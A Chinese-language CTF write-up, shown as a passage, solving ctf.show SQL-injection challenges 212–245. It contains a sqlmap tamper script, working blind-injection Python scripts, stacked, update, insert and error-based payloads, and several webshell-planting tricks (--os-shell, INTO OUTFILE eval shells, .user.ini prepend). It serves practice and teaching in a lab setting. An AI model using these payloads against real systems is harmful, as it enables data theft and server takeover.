from lib.core.enums import PRIORITY
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = space2comment(payload)
    retVal = ""
    if payload:
        retVal = base64.b64encode(payload[::-1].encode('utf-8'))
        retVal = base64.b64encode(retVal[::-1]).decode('utf-8')
    return retVal

def space2comment(payload):
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

```shell
py sqlmap.py -u http://e719ce1a-7f14-47e0-bfa2-ce51c75b1619.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://e719ce1a-7f14-47e0-bfa2-ce51c75b1619.challenge.ctf.show:8080/sqlmap.php --safe-url=http://e719ce1a-7f14-47e0-bfa2-ce51c75b1619.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper="tamper/atemptry.py"
```

## 213_sqlmap-OS-Shell

> 练习使用--os-shell 一键getshell
>
> ```php
> //对查询字符进行解密
>   function decode($id){
>     return strrev(base64_decode(strrev(base64_decode($id))));
>   }
> function waf($str){
>     return preg_match('/ |\*/', $str);
> }
> ```

过滤同212，跑了一遍212的payload没有flag，看提示要用-os-shell，flag不在数据库在某个文件里

> --os-shell          调出交互式操作系统 shell
>
> 原理：用into outfile函数将一个可以用来上传的ASP/ASPX/JSP/PHP文件写到网站的根目录下，之后再上传一个文件，这个文件 可以用来执行系统命令，并且将结果返回出来，有点反弹shell的意思
>
> 使用条件: 
> 	（1）网站必须是root权限 	--is-dba --current-user 查看是否为管理员权限
> 	（2）攻击者需要知道网站的绝对路径 
> 	（3）GPC为off，php主动转义的功能关闭

```shell
py sqlmap.py -u http://8b97ac0f-14c4-4215-8970-97f827437938.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://8b97ac0f-14c4-4215-8970-97f827437938.challenge.ctf.show:8080/sqlmap.php --safe-url=http://8b97ac0f-14c4-4215-8970-97f827437938.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --batch --tamper="tamper/atemptry.py" --os-shell
```

但是这里不能一键getshell，说是找不到？？？不过可以看到上传页面已经成功了

> the file stager has been successfully uploaded on '/var/www/html/' - http://8b97ac0f-14c4-4215-8970-97f827437938.challenge.ctf.show:8080/tmputlaw.php

那就可以访问上传页面，传个一句话，蚁剑连一下就有了（路径直接写url:8080/马名）
![](https://i.loli.net/2021/08/07/yXahnVlHfNdkZQO.png)



## 214_时间盲注

又开始写脚本了，不过这里找不到注入点。。很迷惑，看群里师傅说看主页流量，看select.js

![](https://i.loli.net/2021/08/07/kA5OHrD8732BJsG.png)

```js
// 可以看到发送了一个post数据，注入点为ip
layui.use('element', function(){
  var element = layui.element;
  element.on('tab(nav)', function(data){
    console.log(data);
  });
});

$.ajax({
      url:'api/',
      dataType:"json",
      type:'post',
      data:{
        ip:returnCitySN["cip"],
        debug:0
      }

    });
```

写脚本，本来是引用time模块，比较前后时间差的，不过在Y4师傅那学到利用timeout属性：

```python
import requests
url = 'http://3753083c-3203-4ea6-b466-830c0f91167c.challenge.ctf.show:8080/api/'
flag = ""

for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1
        
        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
        # flag
        payload = "select flaga from ctfshow_flagx"
        
        data = {
            "ip": f"if(ascii(substr(({payload}),{i},1))<={mid},sleep(0.5),1)",
            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.5)
            low = mid + 1
        except:
            high = mid

    flag += chr(low)
    print(flag)
    if '}' in flag:
        exit()
    
```

## 215_时间盲注

改为单引号闭合，还有表名

```python
import requests
url = 'http://584d73c9-0368-4b5d-a25d-1ddd673fd08b.challenge.ctf.show:8080/api/'
flag = ""

for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"
        # flag
        payload = "select flagaa from ctfshow_flagxc"
        data = {
            "ip": f"' or if(ascii(substr(({payload}),{i},1))<={mid},sleep(0.5),1) and '1'='1",
            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.5)
            low = mid + 1
        except:
            high = mid

    flag += chr(low)
    print(flag)
    if '}' in flag:
        exit()

```

## 216_时间盲注

> ```php
> where id = from_base64($id);
> ```

这里为了不报错需要把这个函数闭合：`'MQ==')`，然后再拼接我们的payload
为啥不是把整个payload转码呢？
这里借助参数IP传入的数据是传到PHP，属于字符串的拼接，然后PHP再与sql交互，所以拼接使得函数闭合就可以了

```python
import requests
url = 'http://584d73c9-0368-4b5d-a25d-1ddd673fd08b.challenge.ctf.show:8080/api/'
flag = ""

for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"
        # flag
        payload = "select flagaac from ctfshow_flagxcc"
        data = {
            "ip": f"'MQ==') or if(ascii(substr(({payload}),{i},1))<={mid},sleep(0.5),1)#",
            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.5)
            low = mid + 1
        except:
            high = mid

    flag += chr(low)
    print(flag)
    if '}' in flag:
        exit()

```

## 217_时间盲注

> ```php
> 查询语句
> 
>        where id = ($id);
>       
> 返回逻辑
> 
>     //屏蔽危险分子
>     function waf($str){
>         return preg_match('/sleep/i',$str);
>     }   
> ```
>
> benchmark(t,exp)
> 		select benchmark(count,expr)，重复执行count次expr表达式，使得处理时间很长，来产生延迟

括号闭合，ban了sleep，改用benchmark

不过这玩意挺耗时间的，像上面的盲注脚本偶尔也会不准确，这里的不准确性随时间提高，而且这个也比较受网速和服务器响应的影响
看其他师傅的方法可以用time.sleep延时来提高准确性，避免请求和服务器响应过于频繁产生卡顿，虽然说慢是慢点，但准确了很多

```python
import requests
import time

url = 'http://839d178b-bf76-4646-81f9-9c448b0368fb.challenge.ctf.show:8080/api/index.php'
flag = ""

for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxccb' limit 1,1"
        # flag
        payload = "select flagaabc from ctfshow_flagxccb"
        data = {
            'ip': f"if(ascii(substr(({payload}),{i},1))<={mid},benchmark(1000000,md5(1)),1)",
            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.5)
            low = mid + 1
        except:
            high = mid
        time.sleep(0.2)
    flag += chr(low)
    print(flag)
    time.sleep(0.5)
    if '}' in flag:
        exit()
```

## 218_时间盲注-rlike

> ```php
>     //屏蔽危险分子
>     function waf($str){
>         return preg_match('/sleep|benchmark/i',$str);
>     }   
>       
> ```

benchmark也被ban了，不过还有其他延时的方式：[[SQL注入有趣姿势总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5505)](https://www.cnblogs.com/forforever/p/13019703.html)

这里用rlike：通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短

```python
import requests
import time

url = 'http://4488f471-e479-4241-95fd-bc62e60b4500.challenge.ctf.show:8080/api/index.php'
flag = ""
ftime="concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) rlike '(a.*)+(a.*)+b'"


for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select group_concat(column_name) from information_schema.columns where table_name = 'ctfshow_flagxc'"
        # flag
        payload = "select group_concat(flagaac) from ctfshow_flagxc"
        data = {
            'ip': f"if(ascii(substr(({payload}),{i},1))<={mid},{ftime},1)",
            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.2)
            low = mid + 1
        except:
            high = mid
        time.sleep(0.5)
    flag += chr(low)
    print(flag)
    time.sleep(1)
    if '}' in flag:
        exit()

        #ctfshow{e93f0572-914a-48fc-ab16-ae07dcc44abb}
        #ctfshow{e93e0572-914a-48ec-ab36-ae07dcc44abb}
        #ctfshow{e93f0572-914a-48fc-ab36-ae07dcc44abb}
```

## 219_时间盲注-笛卡尔积

> ```php
>     //屏蔽危险分子
>     function waf($str){
>         return preg_match('/sleep|benchmark|rlike/i',$str);
>     }   
>       
> ```

ban掉了rlike，用笛卡尔积

```python
import requests
import time

url = 'http://eacce1a8-d8da-4403-a0ef-c66bed5c8485.challenge.ctf.show:8080/api/index.php'
flag = ""

for i in range(66):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # 库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 列
        # payload = "select group_concat(column_name) from information_schema.columns where table_name = 'ctfshow_flagxca'"
        # flag
        payload = "select group_concat(flagaabc) from ctfshow_flagxca"
        data = {
            'ip': f"if(ascii(substr(({payload}),{i},1))<={mid},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)",

            "debug": 0
        }

        try:
            r = requests.post(url, data=data, timeout=0.2)
            low = mid + 1
        except:
            high = mid
        time.sleep(0.75)
    flag += chr(low)
    print(flag)
    time.sleep(1)
    if '}' in flag:
        exit()

```

## 220_时间盲注

> ```php
>     //屏蔽危险分子
>     function waf($str){
>         return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
>     }   
>       
> ```

算是综合上述知识点，绕过就行，那么盲注也告一段落了

```python
import requests
import time

url = 'http://d0fa95d7-d8b8-459a-aaa8-4b41dee947a1.challenge.ctf.show:8080/api/index.php'
flag = ""
strs = "1234567890-_{}qwertyuiopasdfghjklzxcvbnm"

for i in range(100):
    for j in strs:
        # 库
        # payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
        # 列
        # payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"
        # flag
        payload = "select flagaabcc from ctfshow_flagxcac"
        data = {
            'ip': f"1) or if(left(({payload}),{i})='{flag+j}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1",
            "debug": 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=3)
        except:
            flag += j
            print(flag)
            break
            if j == "}":
                exit()

```

## 221_other注入-limit 注入

> 查询语句
>
> ```php
>   //分页查询
>   $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;
>       
> ```
>
> 返回逻辑
>
> ```php
> //TODO:很安全，不需要过滤
> //拿到数据库名字就算你赢
> ```

关于limit注入可以看p神转载的这篇[[转载\]Mysql下Limit注入方法 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

> 查询的时候回使用limit来返回指定位置指定数量的数据：
>
> ```mysql
> SELECT * FROM table LIMIT [offset,] rows | rows OFFSET offset
> ```
>
> LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。
>
> LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。
> 如果只给定一个参数，它表示返回最大的记录行数目
> 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。

> 利用procedure analyse进行注入
>
> ```mysql
> # 报错注入
> mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
> 
> ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
> ```
>
> ```mysql
> 基于时间注入：（直接使用sleep不行，需要用BENCHMARK代替）
> 
> SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
> ```
>
> 

本题开了报错，那么payload如下：

```
url/api/?page=1&limit=1 procedure analyse(extractvalue(1,concat(0x3e,database(),0x3c)),1)
```



## 222_other注入-group by

> 注入点找主页select.js，在url/api/?u=$username
>
> ```php
> $sql = select * from ctfshow_user group by $username;
> ```
>
> 测试发现可以用if语句进行bool盲注：if(payload,id,1)

写脚本：

```python
import requests
url = 'http://ff05a8f1-ee2f-4303-9a48-8029259e9e49.challenge.ctf.show:8080/api/'
flag = ""
i = 0

while True:
    i += 1
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{},id,1)"
        # payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{},1))>{},id,1)"
        payload = "if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),{},1))>{},id,1)"
        params = {"u": payload.format(i, mid)}

        r = requests.get(url=url, params=params)
        if '15' in r.text:
            low = mid + 1
        else:
            high = mid

    if low != 32:
        flag += chr(low)
    else:
        break
    print(flag)

```

## 223_other注入-group by-构造数字

同上，但是用户名过滤了数字，利用之前学的数字构造就行，这里用最简单的True

```python
import requests
url = 'http://a9228534-c1a4-4452-adae-6f6f032e7bd8.challenge.ctf.show:8080/api/'
flag = ""
i = 0

def mdnum(i):
    num = "true"
    if i == 1:
        return num
    else:
        for i in range(i-1):
            num += "+true"
    return num

while True:
    i += 1
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},true))>{},id,true)"
        # payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),{},true))>{},id,true)"
        payload = "if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),{},true))>{},id,true)"
        params = {"u": payload.format(mdnum(i), mdnum(mid))}

        r = requests.get(url=url, params=params)
        if '15' in r.text:
            low = mid + 1
        else:
            high = mid

    if low != 32:
        flag += chr(low)
    else:
        break
    print(flag)


```

## 224_other注入-文件名注入

> 确实挺有难度的，学到了，wp看这里[CTFshow 36D Web Writeup – 颖奇L'Amore (gem-love.com)](https://www.gem-love.com/ctf/2283.html#你没见过的注入)
> 主要原理是：
> finfo类下的`file()`方法可以检测图片的EXIF信息，而EXIF信息中有一个comment字段，相当于图片注释，而`finfo->file()`正好能够输出这个信息，如果上面的假设成立，这就可以造成SQL注入

这里可以下载群文件里师傅整理好的payload.bin，也可以照着y1ng师傅的复现一些，上传之后会生成1.php，就可以rce了，确实强

```php
这部分十六进制是<?=`$_GET[1]`?>，那么url/1.php?u=tac /flag就能拿到flag了
```

![](https://i.loli.net/2021/08/08/SnLAuyoptKfOszi.png)

## 225_堆叠注入提升-handler与预处理

> ```php
>   if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){
>     die(json_encode($ret));
>   }
> ```

经典，强网杯随便注，三种方法：alter、handle、prepare预处理，这里把alterban掉了
先把表名`ctfshow_flagasa`注出来：

```
/api/?username=';show tables;#
```

1、handle

```
1';
handler `ctfshow_flagasa` open as `a`;
handler `a` read next;#
```

2、prepare预处理，这里set被ban了就不定义变量了，直接执行（十六进制或者concat拼接都可以）

```
';prepare execsql from 0x73656c6563742a66726f6d6063746673686f775f666c616761736160;execute execsql;#
';prepare execsql from concat('sele','ct * from `ctfshow_flagasa`');execute execsql;#
```

## 226_堆叠注入提升-16进制绕过

> ```php
>   if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)){
>     die(json_encode($ret));
>   }
> ```
>
> 相比上题，ban了左括号和show，继续用十六进制的预处理就可以了

```
// 表名ctfsh_ow_flagas
/api/?username=';prepare execsql from 0x73686f77207461626c65733b;execute execsql;#

//flag
/api/?username=';prepare execsql from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761733b;execute execsql;#
```

## 227_堆叠注入提升-存储过程

> ```php
> if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i',$username)){
>     die(json_encode($ret));
>   }
> ```
>
> 这题少了很多限制，不过数据库里找不到flag表，传马也没能拿到flag；
> 考点是存储过程，简单的说就是专门干一件事一段sql语句，相当于用户自己定义的函数
> [ MySQL——查看存储过程和函数_时光·漫步的博客-CSDN博客_mysql查看函数命令](https://blog.csdn.net/qq_41573234/article/details/80411079)

存储过程和函数的信息都存储在`information_schema.Routines`中，还是用上面的方法构造十六进制：

```
/api/?username=';prepare execsql from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e526f7574696e65733b;execute execsql;#
```

直接就可以拿到flag，也可以调用其定义的getFlag()函数来查看：

```
';call getFlag();#
```

![](https://i.loli.net/2021/08/08/aFDirBqIfdTwJtj.png)

## 228-230_堆叠注入提升-黑盒waf

>
> waf没有直接给出来，不过十六进制预处理可以通杀
>
> ```
> // 表名
> /api/?username=';prepare execsql from 0x73686f77207461626c65733b;execute execsql;#
> ```
>
> 228:		过滤了 , 和 (
> 1、
>
> ```
> /api/?username=';prepare execsql from 0x73656c656374202a2066726f6d2063746673685f6f775f666c6167617361613b;execute execsql;#
> ```
>
> 2、
>
> ```
> /api/?username=';handler ctfsh_ow_flagasaa open;handler ctfsh_ow_flagasaa read next;
> ```
>
> 229:		过滤了open，handle用不了了
>
> ```
> /api/?username=';prepare execsql from 0x73656c656374202a2066726f6d20666c61673b;execute execsql;#
> ```
>
> 230:		没试，还是十六进制
>
> ```
> /api/?username=';prepare execsql from 0x73656c656374202a2066726f6d20666c616761616262783b;execute execsql;#
> ```
>
> 

## 231-232_update注入

> 还是主页select.js，在/api/用post传username和password
>
> ```php
> 231：
> $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
> ```
>
> 没有任何过滤，对password处理即可,闭合pass，利用set将查询结果赋给username，后面where注释掉就行
>
> ```php
> 232：
> $sql = "update ctfshow_user set pass = md5('{$password}') where username =
> '{$username}';";
> ```
>
> 232就是换了个闭合方式

> 231：
>
> ```
> #列：
> username=1&password=', username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
> #字段：
> username=1&password=', username=(select group_concat(column_name) from information_schema.columns where table_name='flaga')#
> #flag：
> username=1&password=', username=(select flagas from flaga)#
> ```
>
> 232
>
> ```
> #列：
> username=1&password='), username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
> #字段：
> username=1&password='), username=(select group_concat(column_name) from information_schema.columns where table_name='flagaa')#
> #flag：
> username=1&password='), username=(select flagass from flagaa)#
> ```

## 233_update注入-时间盲注

看起来和上题没啥差别呀，不过不知道为啥payload没用了，盲注吧

```python
import time
import requests

url = 'http://2793a1b4-ccac-4df8-9b7c-1599da86c944.challenge.ctf.show:8080/api/'
flag = ""
i = 0
while 1:
    i += 1
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
        payload = "select group_concat(flagass233) from flag233333"
        data = {
            "username": f"' or if(ascii(substr(({payload}),{i},1))<={mid},sleep(0.02),1)#",
            "password": 1
        }

        try:
            r = requests.post(url, data=data, timeout=0.35)
            low = mid + 1
        except:
            high = mid
        time.sleep(0.3)
    flag += chr(low)
    print(flag)
	time.sleep(1)

```

## 234_update注入-反斜杠绕过

说着无过滤，修修改改跑了半天，其实过滤了单引号。。
可以利用`\`将单引号转义：

> 传入
>
> ```
> password=\ 
> ```
>
> 原sql语句：
>
> ```php
> $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
> ```
>
> 拼接到语句里为：
>
> ```mysql
> update ctfshow_user set pass = '\' where username = '{$username}';
> 
> ```
>
> 即pass =` '\' where username = '` , 再用#将{$username}后面的单引号注释，使得username可控

```
#列：
username=,username=(select group_concat(table_name) from
information_schema.tables where table_schema=database())#&password=\
#字段：
username=,username=(select group_concat(column_name) from
information_schema.columns where table_name=0x666c6167323361)#&password=\
#flag：
username=,username=(select flagass23s3 from flag23a)#&password=\
```

## 235_update注入-无列名注入

很经典，[Bypass information_schema与无列名注入_WHOAMIAnony的博客-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/106647880)

过滤了`or`和`'` ，表information就用不了了，改用InnoDB引擎或者sys
爆表名

```
username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&password=\
```

然后就是无列名注入，可以看这篇[CTF|mysql之无列名注入 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/98206699)

```
username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flag23a1)x)#&password=\
```

## 236_update注入-无列名注入

在返回逻辑比上题多过滤了一个flag，可能是远古时期用的是flag{}的形式？？
还是用上题的payload即可，不过如果是过滤ctfshow的话可以转码（比如to_base64、hex这些）再输出，也就是刚开始做题的套路

```
username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&password=\
```

```
username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flaga)x)#&password=\

username=,username=(select to_base64(group_concat(`2`)) from (select 1,2,3 union select * from flaga)x)#&password=\
```

## 237、238_insert注入

> ```php
>  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
> ```
>
> 237无过滤，构造闭合和payload，后面238过滤了空格，这里直接写了;password随便输一个就行

```
username=',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#
&password=1

237：
username=',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')));-- #
&password=1

username=',(select(flagass23s3)from(flag));-- #
&password=1

238：
username=',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#
&password=1

username=',(select(flag)from(flagb)));#
&password=1
```

## 239_-Insert注入-过滤or和*

> ```
> //过滤空格和or
> ```
>
> 改用mysql.innodb_table_stats，然后无列名注入

查表：flagbb

```
username=',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#
&password=1
```

但是*被ban掉了？？，构造的无列名注入没有反应，看其他师傅是猜列名flag不变：

```
',(select(flag)from(flagbb)));#
```

## 240_Insert注入_表名爆破

> Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
>
> ```
>   //过滤空格 or sys mysql
> ```
>
> 显然表名注不出来了，只能是写脚本爆，列名应该还是flag

我的思路是把所有可能的表名都传一遍：

```python
import requests
url = "http://fb31fe56-db98-498c-be0e-f1edd8a7f790.challenge.ctf.show:8080/api/insert.php"
for a in "ab":
    for b in "ab":
        for c in "ab":
            for d in "ab":
                for e in "ab":
                    t = "flag" + a + b + c + d + e
                    data = {
                        'username': "1',(select(group_concat(flag))from({})))#".format(t),
                        'password': '1'
                    }
                    r = requests.post(url, data=data)
```

## 241_delete注入

删除记录之后没有回显，只能是盲注了，bool的话没有判断条件，还是时间吧

```python
import time
import requests

url = 'http://9964bd44-142f-4d8c-bb67-eed4c9a487aa.challenge.ctf.show:8080/api/delete.php'
flag = ""
i = 0
while 1:
    i += 1
    low = 32
    high = 127
    while low < high:
        mid = (low + high) >> 1

        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"
        payload = "select group_concat(flag) from flag"
        data = {
            "id": f"if(ascii(substr(({payload}),{i},1))<={mid},sleep(0.02),1)#"
        }

        try:
            r = requests.post(url, data=data, timeout=0.35)
            low = mid + 1
        except:
            high = mid
        time.sleep(0.3)
    flag += chr(low)
    print(flag)
time.sleep(0.3)

```

## 242_file-文件注入

> ```php
> $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
> ```

导出文件到/dump目录下，看一下into outfile 后面还能加什么

> ```mysql
> SELECT ... INTO OUTFILE 'file_name'
>         [CHARACTER SET charset_name]
>         [export_options]
> 
> export_options:
>     [{FIELDS | COLUMNS}
>         [TERMINATED BY 'string']//分隔符
>         [[OPTIONALLY] ENCLOSED BY 'char']
>         [ESCAPED BY 'char']
>     ]
>     [LINES
>         [STARTING BY 'string']
>         [TERMINATED BY 'string']
>     ]
> ```
>
> “OPTION”参数为可选参数选项，其可能的取值有：
>
> `FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
>
> `FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
>
> `FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
>
> `FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
>
> `LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
>
> `LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。

利用三个能传字符串的选项就可以写马了：

```php
filename=1.php' FIELDS TERMINATED BY '<?php eval($_GET[1]);?>'#
```

## 243_file-文件注入

> ```php
> $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
> //过滤了php
> ```

这题的/dump/index.php写了个假的403页面，”是谎言的味道“
然后就可以利用.user.ini来让index.php文件包含一个图片马

.user.ini:这里得在前后加上回车，因为里面还有其他内容干扰，不然解析不了

```

auto_prepend_file=1.png

```

写payload，因为过滤了php，要用十六进制或者短标签；
对于文件内容，让每一行以分号开始，把无关内容注释掉，再以分号结束把后面也闭合

```php
filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#
```

```php
filename=1.png' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b315d293b3f3e;#
```

## 244_报错注入

> 无过滤
>
> ```php
> $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
> ```

> 这里引用一下D.MIND师傅整理的报错注入方法
> ```mysql
> 1.updatexml() //MySQL 5.1.5 以后可以用
> select * from user where id=1 or updatexml(1,concat(0x7e,database(),0x7e),1)
> 
> 2.extractvalue() //MySQL 5.1.5 以后可以用
> select * from user where id=1 or extractvalue(1,concat(0x7e,database(),0x7e))
> 
> 3.floor()、双查询错误、group by、count() //Mysql5.0及以上版本
> select * from user where ?id=1 union select 1,count(*),concat(0x7e,PAYLOAD,0x7e,floor(rand(0)*2))b from information_schema.tables group by b 
> 
> select * from user where id=1 and (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)));
> 
> 4. join
> select * from(select * from mysql.user a join mysql.user b)c;
> select * from(select * from mysql.user a join mysql.user b using(id))c;
> select * from(select * from mysql.user a join mysql.user b using(id,name))c;
> 
> Mysql 5.0.中存在但是不会报错,5.1后才可以报错
> 
> 下面的函数在我的mysql5.7里无法实现:
> 5.exp()
> select * from user where id=1 and exp(~(select * from (select user () ) a) );
> 
> 6.geometrycollection()
> select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
> 
> 7.multipoint()
> select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
> 
> 8.polygon()
> select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
> 
> 9.multipolygon()
> select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
> 
> 10.linestring()
> extractvalue()与updatexml() 能查询字符串的最大长度为32，如果我们想要的结果超过32，可以用
> substr()、left()、right() 函数截取， concat函数替代： make_set()、lpad()、reverse()、
> repeat()、export_set() （ lpad()、reverse()、repeat() 这三个函数使用的前提是所查询的值
> 中，必须至少含有一个特殊字符，否则会漏掉一些数据）
> payload：
> ctfshow web 245---报错注入2
> select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
> 
> 11.multilinestring()
> select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
> 
> 12.ST_LatFromGeoHash() // MYSQL5.7中才适用
> select ST_LatFromGeoHash(concat(0x7e,(select database()),0x7e));
> 
> ```
>
> 

任选一个构造就行，这里我用最熟悉的updatexml()，不过报错注入有长度限制，用几个函数测两次就行

```mysql
' or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1),1)%23

' or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag'),1),1)%23

// substr：
' or updatexml(1,concat(1,substr((select group_concat(flag) from ctfshow_flag),1,32),1),1)%23
# ctfshow{a793a871-8961-4925-8d80-
' or updatexml(1,concat(1,substr((select group_concat(flag) from ctfshow_flag),20,32),1),1)%23
# d80-8bab53f8bd80}

// left 和 right
' or updatexml(1,concat(1,left((select group_concat(flag) from ctfshow_flag),32),1),1)%23
# ctfshow{a793a871-8961-4925-8d80-
' or updatexml(1,concat(1,right((select group_concat(flag) from ctfshow_flag),32),1),1)%23
# d80-8bab53f8bd80}

# ctfshow{a793a871-8961-4925-8d80-8bab53f8bd80}
```

## 245_报错注入

过滤了updatexml，换一个姿势：extractvalu

```
